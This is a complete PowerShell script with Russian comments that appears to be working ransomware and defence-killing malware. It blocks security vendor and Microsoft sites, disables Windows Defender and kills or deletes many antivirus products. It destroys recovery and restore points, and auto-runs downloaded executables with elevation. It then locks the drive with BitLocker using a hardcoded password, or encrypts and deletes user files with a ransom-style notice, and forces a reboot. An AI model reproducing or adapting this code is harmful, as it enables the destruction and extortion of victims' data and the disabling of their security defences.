# ============================================
# МОДУЛЬ 0: ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
# ============================================
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$build = [int](Get-ItemProperty -Path $regPath -Name "CurrentBuild" -ErrorAction SilentlyContinue).CurrentBuild
if (-not $build) { $build = [Environment]::OSVersion.Version.Build }

$major = [Environment]::OSVersion.Version.Major
$minor = [Environment]::OSVersion.Version.Minor
if ($build -ge 10240) { $major = 10 }

Write-Host "ОС определена: Major=$major, Minor=$minor, Build=$build" -ForegroundColor Cyan

# ============================================
# МОДУЛЬ 1: ПРОВЕРКА ПРАВ SYSTEM
# ============================================
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
    [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
    Exit 1
}
Write-Host "Права SYSTEM подтверждены." -ForegroundColor Green

# ============================================
# МОДУЛЬ 2: БЛОКИРОВКА САЙТОВ (hosts)
# ============================================
$domainsToBlock = @(
    "kaspersky.com", "kaspersky.ru",
    "drweb.ru", "drweb.com",
    "eset.com", "esetnod32.ru",
    "malwarebytes.com",
    "virustotal.com",
    "microsoft.com",
    "support.microsoft.com",
    "update.microsoft.com"
)
$hostsPath = "$env:windir\System32\drivers\etc\hosts"

Write-Host "Блокировка сайтов..." -ForegroundColor Yellow
if (Test-Path $hostsPath) {
    Copy-Item $hostsPath "$hostsPath.bak" -Force
    $currentHosts = Get-Content $hostsPath
    foreach ($domain in $domainsToBlock) {
        foreach ($entry in @($domain, "www.$domain")) {
            if (-not ($currentHosts -match [regex]::Escape($entry))) {
                Add-Content -Path $hostsPath -Value "127.0.0.1    $entry"
                Write-Host "  Заблокирован: $entry" -ForegroundColor Gray
            }
        }
    }
    ipconfig /flushdns
}

# ============================================
# МОДУЛЬ 3: ОТКЛЮЧЕНИЕ WINDOWS DEFENDER
# ============================================
Write-Host "Отключение Windows Defender..." -ForegroundColor Yellow
sc stop WinDefend 2>$null
sc config WinDefend start= disabled 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null

# ============================================
# МОДУЛЬ 3b: УБИЙСТВО АНТИВИРУСОВ (процессы + службы + папки)
# ============================================
Write-Host "Зачистка антивирусов (процессы + службы + папки)..." -ForegroundColor Yellow

$AVProcesses = @(
    "avp", "avpui", "kavtray", "ksde", "ksdeui",
    "AvastSvc", "AvastUI", "aswEngSrv", "afwServ",
    "avgnt", "avguard", "avscan", "Avira.Systray",
    "egui", "ekrn", "eamonm",
    "dwengine", "dwservice", "drwagnui",
    "mbam", "mbamtray", "MBAMService",
    "mcshield", "mcuicnt", "mfeann",
    "nsbu", "nortonsecurity",
    "360tray", "360sd", "zhudongfangyu",
    "bdagent", "vsserv", "bdservicehost",
    "cmdagent", "cistray", "cavwp",
    "coreServiceShell", "pccNtMon", "ntrtscan"
)

foreach ($ProcName in $AVProcesses) {
    $Procs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
    if ($Procs) {
        foreach ($Proc in $Procs) {
            Write-Host "  Убиваю процесс: $ProcName (PID: $($Proc.Id))" -ForegroundColor Red
            Stop-Process -Id $Proc.Id -Force -ErrorAction SilentlyContinue
        }
    }
}

Start-Sleep -Seconds 2

$AVServices = @(
    "AVP", "KAVFS", "klnagent",
    "avast! Antivirus", "AvastWscReporter",
    "Avira.ServiceHost", "Avira.OE.ServiceHost",
    "ekrn", "EhttpSrv", "ekrnEpfw",
    "DrWebEngine", "DrWebNetFilter",
    "MBAMService", "MBAMChameleon",
    "McAfeeFramework", "McShield", "McTaskManager",
    "NortonSecurity", "NSBU",
    "ZhuDongFangYu",
    "VSSERV", "BDAuxSrv", "BDServiceHost",
    "CmdAgent", "cmdvirth",
    "PcCtlCom"
)

foreach ($SvcName in $AVServices) {
    $Svc = Get-Service -Name $SvcName -ErrorAction SilentlyContinue
    if ($Svc) {
        Write-Host "  Останавливаю службу: $SvcName" -ForegroundColor Red
        sc stop "$SvcName" 2>$null
        sc config "$SvcName" start= disabled 2>$null
    }
}

Start-Sleep -Seconds 1

$AVPaths = @(
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files (x86)\Kaspersky Lab",
    "C:\Program Files\AVAST Software",
    "C:\Program Files (x86)\AVAST Software",
    "C:\Program Files\AVG",
    "C:\Program Files (x86)\AVG",
    "C:\Program Files\Avira",
    "C:\Program Files (x86)\Avira",
    "C:\Program Files\ESET",
    "C:\Program Files (x86)\ESET",
    "C:\Program Files\DrWeb",
    "C:\Program Files (x86)\DrWeb",
    "C:\Program Files\Malwarebytes",
    "C:\Program Files (x86)\Malwarebytes",
    "C:\Program Files\McAfee",
    "C:\Program Files (x86)\McAfee",
    "C:\Program Files\Norton",
    "C:\Program Files (x86)\Norton",
    "C:\Program Files\360",
    "C:\Program Files (x86)\360",
    "C:\Program Files\Comodo",
    "C:\Program Files (x86)\Comodo",
    "C:\Program Files\Bitdefender",
    "C:\Program Files (x86)\Bitdefender",
    "C:\Program Files\Trend Micro",
    "C:\Program Files (x86)\Trend Micro",
    "C:\ProgramData\Kaspersky Lab",
    "C:\ProgramData\AVAST Software",
    "C:\ProgramData\Avira",
    "C:\ProgramData\ESET",
    "C:\ProgramData\Malwarebytes",
    "C:\ProgramData\McAfee",
    "C:\ProgramData\Norton",
    "C:\ProgramData\Bitdefender"
)

foreach ($AVPath in $AVPaths) {
    if (Test-Path $AVPath) {
        Write-Host "  Удаляю папку: $AVPath" -ForegroundColor Red
        takeown /f "$AVPath" /a /r 2>$null
        icacls "$AVPath" /grant *S-1-5-32-544:F /c /t 2>$null
        icacls "$AVPath" /grant *S-1-5-18:F /c /t 2>$null
        rmdir /s /q "$AVPath" 2>$null
        Write-Host "  Папка удалена: $AVPath" -ForegroundColor Green
    }
}

# ============================================
# МОДУЛЬ 4: УНИЧТОЖЕНИЕ СРЕДЫ ВОССТАНОВЛЕНИЯ
# ============================================
Write-Host "Удаление среды восстановления..." -ForegroundColor Yellow
takeown /f "C:\Windows\System32\Recovery" /a /r 2>$null
icacls "C:\Windows\System32\Recovery" /grant *S-1-5-32-544:F /c /t 2>$null
rmdir /s /q "C:\Windows\System32\Recovery" 2>$null
rmdir /s /q "C:\System Volume Information" 2>$null

# ============================================
# МОДУЛЬ 5: БЛОКИРОВКА SETUP.EXE И ДРАЙВЕРОВ
# ============================================
Write-Host "Блокировка установки драйверов и setup.exe..." -ForegroundColor Yellow
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f 2>$null

# ============================================
# МОДУЛЬ 5b: ТВИКИ РЕЕСТРА (скрытность, выживание)
# ============================================
Write-Host "Настройка реестра..." -ForegroundColor Yellow

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" /v HideSystray /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v DisableNotifications /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f 2>$null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 0 /f 2>$null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f 2>$null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems" /v Windows /t REG_SZ /d "%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768" /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d "cmd.exe" /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f 2>$null

Write-Host "Реестр настроен." -ForegroundColor Green

# ============================================
# МОДУЛЬ 6: УДАЛЕНИЕ ФАЙЛА ЗАЩИТНИКА (MsMpEng.exe)
# ============================================
Write-Host "Поиск и удаление MsMpEng.exe..." -ForegroundColor Yellow
$DefenderProc = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
if ($DefenderProc) {
    Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}
$DefenderPath = "C:\ProgramData\Microsoft\Windows Defender\Platform"
if (Test-Path $DefenderPath) {
    $MsMpEngFiles = Get-ChildItem -Path $DefenderPath -Recurse -Filter "MsMpEng.exe" -ErrorAction SilentlyContinue
    foreach ($File in $MsMpEngFiles) {
        takeown /f "$($File.FullName)" /a 2>$null
        icacls "$($File.FullName)" /grant *S-1-5-32-544:F /c 2>$null
        icacls "$($File.FullName)" /grant *S-1-5-18:F /c 2>$null
        Remove-Item -Path $File.FullName -Force -ErrorAction SilentlyContinue
        Write-Host "  Удален: $($File.FullName)" -ForegroundColor Red
    }
}

# ============================================
# МОДУЛЬ 7: ФОНОВЫЙ СТОРОЖ DOWNLOADS
# ============================================
Write-Host "Запуск сторожа Downloads..." -ForegroundColor Green
Start-Job -Name "DownloadWatcher" -ScriptBlock {
    $Folder = "$HOME\Downloads"
    $Watcher = New-Object System.IO.FileSystemWatcher
    $Watcher.Path = $Folder
    $Watcher.Filter = "*.*"
    $Watcher.IncludeSubdirectories = $false
    $Watcher.EnableRaisingEvents = $true

    $Action = {
        $Path = $Event.SourceEventArgs.FullPath
        Start-Sleep -Milliseconds 1000
        
        if (Test-Path $Path) {
            $Extension = [System.IO.Path]::GetExtension($Path)
            if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
                
                $IsMarked = Get-Item -Path $Path -Stream "Verified" -ErrorAction SilentlyContinue
                
                if ($null -eq $IsMarked) {
                    takeown /f "$Path" /a 2>$null
                    icacls "$Path" /grant *S-1-5-32-544:F /c 2>$null
                    icacls "$Path" /grant *S-1-5-18:F /c 2>$null
                    Set-Content -Path $Path -Stream "Verified" -Value "True"
                    Start-Process -FilePath $Path -Verb RunAs
                } else {
                    Start-Process -FilePath $Path -Verb RunAs
                }
            }
        }
    }
    Register-ObjectEvent $Watcher "Created" -Action $Action
    while ($true) { Start-Sleep -Seconds 5 }
}

# ============================================
# МОДУЛЬ 8: ФОНОВЫЙ ETW-МОНИТОР (таргетированный)
# ============================================
Write-Host "Запуск ETW-монитора..." -ForegroundColor Green
Start-Job -Name "ETWMonitor" -ScriptBlock {
    $TargetProcesses = @("kaspersky", "avast", "avp", "drweb", "eset", "mbam", "adwcleaner", "rkill")
    $FileLimit = 100
    $MonitoredFolders = @("C:\Users", "D:\")

    $ProcessTracker = [System.Collections.Concurrent.ConcurrentDictionary[int, [System.Collections.Generic.HashSet[string]]]]::new()
    $SessionName = "FinalDefenseSession"
    $LogFile = "$env:TEMP\final_defense.etl"

    logman stop $SessionName -etw 2>$null
    logman create trace $SessionName -rt -nb 16 256 -o $LogFile -p "Microsoft-Windows-Kernel-File" 0x10 2>$null

    try {
        Get-WinEvent -RawProvider -ProviderName "Microsoft-Windows-Kernel-File" -Oldest -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Id -eq 12 -and $_.ProcessId) {
                $PidNum = $_.ProcessId
                
                $ProcName = (Get-Process -Id $PidNum -ErrorAction SilentlyContinue).Name
                if (-not $ProcName -or -not ($TargetProcesses -contains $ProcName.ToLower())) { return }

                $FilePath = $_.Properties[3].Value.ToString()
                if (-not $FilePath -or $FilePath -match "^\s*$") { return }
                $FilePathLower = $FilePath.ToLower()

                $IsInMonitoredFolder = $false
                foreach ($Folder in $MonitoredFolders) {
                    if ($FilePathLower.StartsWith($Folder.ToLower())) {
                        $IsInMonitoredFolder = $true
                        break
                    }
                }
                if (-not $IsInMonitoredFolder) { return }

                $UserHashSet = $ProcessTracker.GetOrAdd($PidNum, [System.Collections.Generic.HashSet[string]]::new())
                [System.Threading.Monitor]::Enter($UserHashSet)
                try {
                    [void]$UserHashSet.Add($FilePathLower)
                    $Count = $UserHashSet.Count
                }
                finally {
                    [System.Threading.Monitor]::Exit($UserHashSet)
                }

                if ($Count -gt $FileLimit) {
                    Write-Host "[ETW ALERT] Процесс '$ProcName' (PID: $PidNum) превысил лимит! Файлов: $Count" -ForegroundColor Red
                    Stop-Process -Id $PidNum -Force -ErrorAction SilentlyContinue
                    logman stop $SessionName -etw 2>$null
                    Remove-Item $LogFile -ErrorAction SilentlyContinue
                    break
                }
            }
        }
    }
    finally {
        logman stop $SessionName -etw 2>$null
        Remove-Item $LogFile -ErrorAction SilentlyContinue
    }
}

# ============================================
# МОДУЛЬ 9: ШИФРОВАНИЕ (BitLocker или Fallback-архив)
# ============================================
Write-Host "Проверка TPM для BitLocker..." -ForegroundColor Yellow
$Tpm = Get-Tpm -ErrorAction SilentlyContinue

if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
    Write-Host "BitLocker доступен. Включаю..." -ForegroundColor Green
    $Password = ConvertTo-SecureString "YHsgh273h*jY632H23##h#^y7h#^#@#h@" -AsPlainText -Force
    Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password $Password -UsedSpaceOnly -SkipHardwareTest -ErrorAction SilentlyContinue
    Write-Host "BitLocker включен." -ForegroundColor Green
} else {
    Write-Host "BitLocker недоступен. Запуск архивного шифрования..." -ForegroundColor Orange
    
    $Password = "YHsgh273h*jY632H23##h#^y7h#^#@#h@"
    $ArchivePath = "$env:USERPROFILE\Desktop\encrypted_archive.zip"
    $DriveToScan = "C:"
    $MaxFileSizeMB = 50
    
    $ExcludeDirs = @(
        "\Windows\",
        "\Program Files\",
        "\Program Files (x86)\",
        "\ProgramData\Microsoft\",
        "\`$Recycle.Bin\",
        "\System Volume Information\",
        "\Recovery\"
    )
    
    $TargetExtensions = @(
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
        ".txt", ".rtf", ".csv", ".mdb", ".accdb", ".one", ".odt", ".ods",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai",
        ".mp4", ".avi", ".mov", ".mkv", ".wmv", ".flv", ".mp3", ".wav", ".wma",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".html", ".htm", ".xml", ".json", ".sql", ".db", ".sqlite",
        ".cpp", ".cs", ".java", ".py", ".ps1", ".bat", ".sh"
    )
    
    Write-Host "[BitLocker] Не сработал. Запускаю архивный fallback..." -ForegroundColor Orange
    
    $FilesToEncrypt = @()
    Get-ChildItem -Path $DriveToScan -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $FullPath = $_.FullName
        $Ext = $_.Extension.ToLower()
        
        $Excluded = $false
        foreach ($ExDir in $ExcludeDirs) {
            if ($FullPath -like "*$ExDir*") {
                $Excluded = $true
                break
            }
        }
        
        $ExcludeFileNames = @("stub", "client", "payload", "rat", "asyncrat", "server")
        $FileNameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($FullPath).ToLower()
        $ExcludedByName = $false
        foreach ($ExName in $ExcludeFileNames) {
            if ($FileNameWithoutExt.Contains($ExName)) {
                $ExcludedByName = $true
                break
            }
        }
        
        if (-not $Excluded -and -not $ExcludedByName -and ($TargetExtensions -contains $Ext) -and ($_.Length -lt ($MaxFileSizeMB * 1MB))) {
            $FilesToEncrypt += $FullPath
        }
    }
    
    $TotalFiles = $FilesToEncrypt.Count
    Write-Host "[Fallback] Найдено $TotalFiles файлов для шифрования..." -ForegroundColor Yellow
    
    if ($TotalFiles -eq 0) {
        Write-Host "[Fallback] Нечего шифровать. Выход." -ForegroundColor Red
        Exit
    }
    
    Write-Host "[Fallback] Создаю зашифрованный архив: $ArchivePath" -ForegroundColor Cyan
    
    $SevenZip = "C:\Program Files\7-Zip\7z.exe"
    
    if (Test-Path $SevenZip) {
        $FileList = $FilesToEncrypt -join "`n"
        $TempList = "$env:TEMP\files_to_encrypt.txt"
        $FileList | Out-File -FilePath $TempList -Encoding UTF8
        & $SevenZip a -tzip -mem=AES256 -p"$Password" -spf -scsUTF-8 @"$ArchivePath" @"$TempList"
        Remove-Item $TempList -Force
    } else {
        Write-Host "[Fallback] 7-Zip не найден. Использую встроенный метод + пароль через .NET..." -ForegroundColor Yellow
        
        $TempArchive = "$env:TEMP\temp_archive.zip"
        Compress-Archive -Path $FilesToEncrypt -DestinationPath $TempArchive -CompressionLevel Optimal -Force
        
        $zipBytes = [System.IO.File]::ReadAllBytes($TempArchive)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.GenerateIV()
        $salt = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(16)
        $deriveBytes = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Password, $salt, 10000)
        $key = $deriveBytes.GetBytes(32)
        $aes.Key = $key
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($zipBytes, 0, $zipBytes.Length)
        
        $FinalData = $aes.IV + $salt + $encryptedData
        [System.IO.File]::WriteAllBytes($ArchivePath, $FinalData)
        Remove-Item $TempArchive -Force
    }
    
    Write-Host "[Fallback] Архив создан и зашифрован." -ForegroundColor Green
    
    Write-Host "[Fallback] Удаляю оригиналы файлов..." -ForegroundColor Red
    foreach ($File in $FilesToEncrypt) {
        Remove-Item -Path $File -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host "[Fallback] Готово. Все файлы в архиве: $ArchivePath" -ForegroundColor Green
    
    [System.Windows.Forms.MessageBox]::Show(
        "Ваши файлы зашифрованы и упакованы в архив:`n$ArchivePath`n`nПароль для расшифровки у администратора.",
        "Файлы зашифрованы",
        0, 48
    )
}

# ============================================
# ФИНАЛ: ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА
# ============================================
Write-Host "`nВсе модули запущены. Перезагрузка для применения BitLocker..." -ForegroundColor Green
Start-Sleep -Seconds 5
shutdown /r /f /t 0
